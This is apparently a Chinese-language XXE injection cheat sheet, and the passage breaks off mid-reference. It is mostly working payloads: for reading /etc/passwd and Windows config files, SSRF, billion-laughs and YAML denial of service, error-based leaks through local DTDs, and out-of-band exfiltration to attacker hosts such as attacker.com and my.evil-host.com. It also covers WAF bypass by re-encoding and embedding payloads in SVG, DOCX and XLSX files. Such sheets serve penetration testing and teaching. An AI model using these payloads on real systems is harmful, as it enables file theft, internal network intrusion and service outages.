# XML外部实体

> XML外部实体攻击是一种针对解析XML输入并允许XML实体的应用程序的攻击类型。XML实体可以用于指示XML解析器从服务器获取特定内容。

## 概述

- [工具](#工具)
- [检测漏洞](#检测漏洞)
- [利用XXE检索文件](#利用XXE检索文件)
    - [经典XXE](#经典XXE)
    - [经典XXE Base64编码](#经典XXE-Base64编码)
    - [XXE中的PHP包装器](#XXE中的PHP包装器)
    - [XInclude攻击](#XInclude攻击)
- [利用XXE进行SSRF攻击](#利用XXE进行SSRF攻击)
- [利用XXE进行拒绝服务攻击](#利用XXE进行拒绝服务攻击)
    - [十亿笑攻击](#十亿笑攻击)
    - [YAML攻击](#YAML攻击)
    - [参数笑攻击](#参数笑攻击)
- [利用基于错误的XXE](#利用基于错误的XXE)
    - [基于错误的——使用本地DTD文件](#基于错误的——使用本地DTD文件)
        - [Linux本地DTD](#Linux本地DTD)
        - [Windows本地DTD](#Windows本地DTD)
    - [基于错误的——使用远程DTD](#基于错误的——使用远程DTD)
- [利用盲XXE进行带外数据提取](#利用盲XXE进行带外数据提取)
    - [基本盲XXE](#基本盲XXE)
    - [带外XXE](#带外XXE)
    - [带外XXE与DTD和PHP过滤器](#带外XXE与DTD和PHP过滤器)
    - [带外XXE与Apache Karaf](#带外XXE与Apache Karaf)
- [WAF绕过](#WAF绕过)
    - [通过字符编码绕过](#通过字符编码绕过)
    - [JSON端点上的XXE](#JSON端点上的XXE)
- [奇异文件中的XXE](#奇异文件中的XXE)
    - [SVG中的XXE](#SVG中的XXE)
    - [SOAP中的XXE](#SOAP中的XXE)
    - [DOCX文件中的XXE](#DOCX文件中的XXE)
    - [XLSX文件中的XXE](#XLSX文件中的XXE)
    - [DTD文件中的XXE](#DTD文件中的XXE)
- [实验室](#实验室)
- [参考文献](#参考文献)

## 工具

- [staaldraad/xxeserv](https://github.com/staaldraad/xxeserv) - 支持FTP的XXE有效负载的迷你Web服务器
- [lc/230-OOB](https://github.com/lc/230-OOB) - 用于通过FTP检索文件内容并通过[http://xxe.sh/](http://xxe.sh/)生成有效负载的带外XXE服务器
- [enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector) - 使用直接和不同的带外方法自动利用XXE漏洞的工具
- [BuffaloWill/oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - 一种工具，用于将XXE/XML漏洞嵌入到不同类型的文件中（DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF）
- [whitel1st/docem](https://github.com/whitel1st/docem) - 用于在docx、odt、pptx等中嵌入XXE和XSS有效负载的实用工具
- [bytehope/wwe](https://github.com/bytehope/wwe) - 基于wrapwrap和lightyear的PoC工具，演示仅设置了LIBXML_DTDLOAD或LIBXML_DTDATTR标志的PHP中的XXE

## 检测漏洞

**内部实体**: 如果实体在DTD内声明，则称为内部实体。
语法: `<!ENTITY entity_name "entity_value">`

**外部实体**: 如果实体在DTD外声明，则称为外部实体。通过`SYSTEM`识别。
语法: `<!ENTITY entity_name SYSTEM "entity_value">`

基本实体测试，当XML解析器解析外部实体时，结果应在`firstName`中包含"John"，在`lastName`中包含"Doe"。实体在`DOCTYPE`元素内定义。

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

在向服务器发送XML有效负载时，可能有助于设置`Content-Type: application/xml`。

## 利用XXE检索文件

### 经典XXE

我们尝试显示`/etc/passwd`文件的内容。

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

:warning: `SYSTEM`和`PUBLIC`几乎是同义词。

```ps1
<!ENTITY % xxe PUBLIC "随机文本" "URL">
<!ENTITY xxe PUBLIC "任意文本" "URL">
```

### 经典XXE Base64编码

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### XXE中的PHP包装器

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

### XInclude攻击

当你无法修改`DOCTYPE`元素时，可以使用`XInclude`来定位目标

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## 利用XXE进行SSRF攻击

XXE可以与[SSRF漏洞](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)结合，以针对网络上的另一个服务。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

## 利用XXE进行拒绝服务攻击

:warning: 这些攻击可能会使服务或服务器崩溃，请勿在生产环境中使用。

### 十亿笑攻击

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

### YAML攻击

```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

### 参数笑攻击

Sebastian Pipping提出的十亿笑攻击变体，使用延迟解释参数实体。

```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```

## 利用基于错误的XXE

### 基于错误的——使用本地DTD文件

如果基于错误的提取是可能的，您仍然可以依赖本地DTD来执行连接技巧。用于确认错误消息包含文件名的有效载荷。

```xml
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
    %local_dtd;
]>
<root></root>
```

- [GoSecure/dtd-finder](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md) - 使用这些本地DTD生成XXE有效负载的DTD列表。

#### Linux本地DTD

Linux系统上已存储的DTD文件简短列表；使用`locate .dtd`列出：

```xml
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/svg/svg10.dtd
/usr/share/xml/svg/svg11.dtd
/usr/share/yelp/dtd/docbookx.dtd
```

文件`/usr/share/xml/fontconfig/fonts.dtd`在第148行有一个可注入的实体`%constant`：`<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>`

最终有效负载变为：

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```

#### Windows本地DTD

来自[infosec-au/xxe-windows.md](https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79)的载荷。

- 披露本地文件

  ```xml
  <!DOCTYPE doc [
      <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
      <!ENTITY % SuperClass '>
          <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
          &#x25;eval;
          &#x25;error;
        <!ENTITY test "test"'
      >
      %local_dtd;
    ]><xxx>anything</xxx>
  ```

- 披露HTTP响应

  ```xml
  <!DOCTYPE doc [
      <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
      <!ENTITY % SuperClass '>
          <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
          &#x25;eval;
          &#x25;error;
        <!ENTITY test "test"'
      >
      %local_dtd;
    ]><xxx>anything</xxx>
  ```

### 基于错误的——使用远程DTD

**触发XXE的有效载荷**：

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```

**ext.dtd的内容**：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**ext.dtd的替代内容**：

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM '%data;:///'>">
%eval;
%leak;
```

让我们分解有效载荷：

1. `<!ENTITY % file SYSTEM "file:///etc/passwd">`
  此行定义了一个名为file的外部实体，引用了Unix-like系统文件`/etc/passwd`（包含用户帐户详细信息）的内容。
2. `<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">`
  此行定义了一个名为eval的实体，其中包含另一个实体定义。此其他实体（error）旨在引用一个不存在的文件，并在文件路径末尾附加file实体（`/etc/passwd`内容）。`&#x25;`是URL编码的"`%`"，用于在实体定义中引用实体。
3. `%eval;`
  此行使用eval实体，导致定义error实体。
4. `%error;`
  最后，此行使用error实体，尝试访问一个不存在的文件，其路径包括`/etc/passwd`的内容。由于文件不存在，将引发错误。如果应用程序将错误报告给用户并包含文件路径在错误消息中，则`/etc/passwd`的内容将作为错误消息的一部分披露，揭示敏感信息。

## 利用盲XXE进行带外数据提取

有时页面不会输出结果，但您仍然可以通过带外攻击提取数据。

### 基本盲XXE

测试盲XXE的最简单方法是尝试加载远程资源，例如Burp Collaborator。

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net'>]>
<root>&test;</root>
```

发送`/etc/passwd`的内容到“www.malicious.com”，您可能会收到第一行。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]
>
<foo>&callhome;</foo>
```

### 带外XXE

> Yunusov, 2013

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>

存储在http://publicServer.com/parameterEntity_oob.dtd上的文件
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```

### 使用DTD和PHP过滤器的带外XXE

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

存储在http://127.0.0.1/dtd.xml上的文件
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

### 使用Apache Karaf的带外XXE

影响版本：

- Apache Karaf <= 4.2.1
- Apache Karaf <= 4.1.6

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```

将XML文件发送到`deploy`文件夹。

参考[https://github.com/brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)

## WAF绕过

### 通过字符编码绕过

XML解析器使用4种方法来检测编码：

- HTTP Content-Type: `Content-Type: text/xml; charset=utf-8`
- 读取字节顺序标记（BOM）
- 读取文档的第一个符号
    - UTF-8 (3C 3F 78 6D)
    - UTF-16BE (00 3C 00 3F)
    - UTF-16LE (3C 00 3F 00)
- XML声明: `<?xml version="1.0" encoding="UTF-8"?>`

| 编码 | BOM      | 示例                             |              |
| -------- | -------- | ----------------------------------- | ------------ |
| UTF-8    | EF BB BF | EF BB BF 3C 3F 78 6D 6C             | ...<?xml     |
| UTF-16BE | FE FF    | FE FF 00 3C 00 3F 00 78 00 6D 00 6C | ...<.?.x.m.l |
| UTF-16LE | FF FE    | FF FE 3C 00 3F 00 78 00 6D 00 6C 00 | ..<.?.x.m.l. |

**示例**: 我们可以使用[iconv](https://man7.org/linux/man-pages/man1/iconv.1.html)将有效载荷转换为`UTF-16`以绕过某些WAF：

```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

### JSON端点上的XXE

在HTTP请求中尝试将`Content-Type`从**JSON**切换到**XML**，

| Content Type       | 数据                               |
| ------------------ | ---------------------------------- |
| `application/json` | `{"search":"name","value":"test"}` |
| `application/xml`  | `<?xml version="1.0" encoding="UTF-8" ?><root><search>name</search><value>data</value></root>` |

- XML文档必须包含一个根元素`<root>`，它是所有其他元素的父元素。
- 数据也必须转换为XML，否则服务器将返回错误。

```json
{
  "errors":{
    "errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."
  }
}
```

- [NetSPI/Content-Type Converter](https://github.com/NetSPI/Burp-Extensions/releases/tag/1.4)

## 奇异文件中的XXE

### SVG中的XXE

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```

**经典**：

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**通过SVG栅格化进行OOB**：

_xxe.svg_:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

_xxe.xml_:

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
```

### SOAP中的XXE

```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

### DOCX文件中的XXE

Open XML文件格式（将有效负载注入任何.xml文件）：

- /_rels/.rels
- [Content_Types].xml
- 默认主文档部分
    - /word/document.xml
    - /ppt/presentation.xml
    - /xl/workbook.xml

然后更新文件`zip -u xxe.docx [Content_Types].xml`

工具：[https://github.com/BuffaloWill/oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)

```xml
DOCX/XLSX/PPTX
ODT/ODG/ODP/ODS
SVG
XML
PDF (实验性)
JPG (实验性)
GIF (实验性)
```

### XLSX文件中的XXE

XLSX结构：

```ps1
$ 7z l xxe.xlsx
[...]
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00 .....          578          223  _rels/.rels
2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml
2021-10-17 15:19:00 .....          731          352  docProps/core.xml
2021-10-17 15:19:00 .....          410          246  docProps/app.xml
2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00              11216         3586  9 files
```

提取Excel文件：`7z x -oXXE xxe.xlsx`

重新构建Excel文件：

```ps1
cd XXE
zip -r -u ../xxe.xlsx *
```

警告：使用`zip -u`（[https://infozip.sourceforge.net/Zip.html](https://infozip.sourceforge.net/Zip.html)）而不是`7z u` / `7za u`（[https://p7zip.sourceforge.net/](https://p7zip.sourceforge.net/)）或`7zz`（[https://www.7-zip.org/](https://www.7-zip.org/)），因为它们不会以相同的方式重新压缩，许多Excel解析库将无法将其识别为有效的Excel文件。使用`file XXE.xlsx`显示的魔数字节签名将显示为`Microsoft Excel 2007+`（使用`zip -u`），而无效的则显示为`Microsoft OOXML`。

在`xl/workbook.xml`中添加您的盲XXE有效负载。

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```

或者，在`xl/sharedStrings.xml`中添加您的有效负载：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
```

使用远程DTD将节省我们每次想要检索不同文件时重建文档的时间。相反，我们可以先构建一次文档，然后更改DTD。使用FTP代替HTTP允许检索更大的文件。

`xxe.dtd`

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
```

使用[staaldraad/xxeserv](https://github.com/staaldraad/xxeserv)提供DTD并接收FTP有效负载：

```ps1
xxeserv -o files.log -p 2121 -w -wd public -wp 8000
```

### 在DTD文件中的XXE

上述大多数XXE有效载荷都需要控制DTD或`DOCTYPE`块以及`xml`文件。
在极少数情况下，您可能只能控制DTD文件，而无法修改`xml`文件。例如，MITM。
当您唯一控制的是DTD文件，且不控制`xml`文件时，XXE仍可能通过此有效载荷实现。

```xml
<!-- 将敏感文件的内容加载到变量中 -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!-- 使用该变量构造带有文件内容的HTTP GET请求 -->
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
%param1;
%external;
```

## 实验室

- [Root Me - XML外部实体](https://www.root-me.org/en/Challenges/Web-Server/XML-External-Entity)
- [PortSwigger Labs for XXE](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection)
    - [利用外部实体的XXE检索文件](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
    - [利用XXE进行SSRF攻击](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
    - [带外交互的盲XXE](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
    - [通过XML参数实体的带外交互的盲XXE](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
    - [利用带外交互的盲XXE提取数据](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
    - [通过错误消息检索数据的盲XXE](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
    - [利用XInclude检索文件](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
    - [通过文件上传的XXE](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
    - [通过重新利用本地DTD的XXE检索数据](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
- [GoSecure workshop - 高级XXE利用](https://gosecure.github.io/xxe-workshop)

## 参考文献

- [深入解析XXE注入 - Trenton Gordon - 2019年7月22日](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/)
- [自动化XXE利用的本地DTD发现 - Philippe Arteau - 2019年7月16日](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation)
- [Uber盲带外XXE - 26个域被黑客攻击 - Raghav Bisht - 2016年8月5日](http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html)
- [CVE-2019-8986: TIBCO JasperReports Server中的SOAP XXE - Julien Szlamowicz, Sebastien Dudek - 2019年3月11日](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf)
- [在加固服务器上使用XXE进行数据提取 - Ritik Singh - 2022年1月29日](https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac)
- [检测和利用SAML接口中的XXE - Christian Mainka (@CheariX) - 2014年11月6日](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)
- [利用文件上传功能中的XXE - Will Vandevanter (@_will_is_) - 2015年11月19日](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
- [利用Excel中的XXE - Marc Wickenden - 2018年11月12日](https://www.4armed.com/blog/exploiting-xxe-with-excel/)
- [利用本地DTD文件的XXE - Arseniy Sharoglazov - 2018年12月12日](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
- [从盲XXE到根级文件读取访问 - Pieter Hiele - 2018年12月12日](https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)
- [如何获得Google生产服务器的读取访问权限 - Detectify - 2014年4月11日](https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/)
- [PHP中的不可能的XXE - Aleksandr Zhurnakov - 2025年3月11日](https://swarm.ptsecurity.com/impossible-xxe-in-php/)
- [午夜太阳CTF 2019资格赛 - Rubenscube - jbz - 2019年4月6日](https://jbz.team/midnightsunctfquals2019/Rubenscube)
- [通过SAML的带外XXE - Sean Melia (@seanmeals) - 2016年1月](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)
- [Cisco